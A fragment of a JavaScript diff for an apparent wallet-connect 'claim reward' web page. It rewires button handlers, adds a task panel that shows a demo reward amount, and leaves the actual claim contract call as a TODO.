         const address = accounts[0].toLowerCase();
 
-        setStatus("Claiming $10 reward…");
+        setStatus("Claiming reward…");
 
         // TODO: add your real claim contract call here
         // const ethersProvider = new ethers.BrowserProvider(providerInstance);
@@ -1033,22 +907,37 @@
       }
     }
 
+    // ===== DOMContentLoaded =====
     document.addEventListener("DOMContentLoaded", async function(){
       initWeb3ModalInstance();
 
-      // All connect buttons on the RIGHT of cards
-      const connectBtns = document.querySelectorAll(".connectBtn");
-      connectBtns.forEach(btn => {
-        btn.addEventListener("click", connectFlow);
-      });
+      if(connectBtn){
+        connectBtn.addEventListener("click", connectFlow);
+      }
+      if(claimBtn){
+        claimBtn.addEventListener("click", claimReward);
+      }
+      if(taskBtn){
+        taskBtn.addEventListener("click", function(){
+          if(!taskPanel) return;
+          const visible = taskPanel.style.display !== "none";
+          taskPanel.style.display = visible ? "none" : "block";
+        });
+      }
+      if(taskCompleteBtn){
+        taskCompleteBtn.addEventListener("click", function(){
+          isTaskCompleted = true;
+          if(rewardAmountDisplay){
+            rewardAmountDisplay.textContent = "$" + DEMO_REWARD_AMOUNT.toFixed(2);
+          }
+          if(taskStatusTextEl){
+            taskStatusTextEl.style.display = "block";
+          }
+          updateClaimState();
+        });
+      }
 
-      // All claim buttons
-      const claimButtons = document.querySelectorAll(".claimBtn");
-      claimButtons.forEach(btn => {
-        btn.addEventListener("click", claimReward);
-      });
-
-      await tryAutoReconnect();
+      await autoConnectOnLoad();
       const yearEl = document.getElementById("year");
       if(yearEl) yearEl.textContent = new Date().getFullYear();
     });
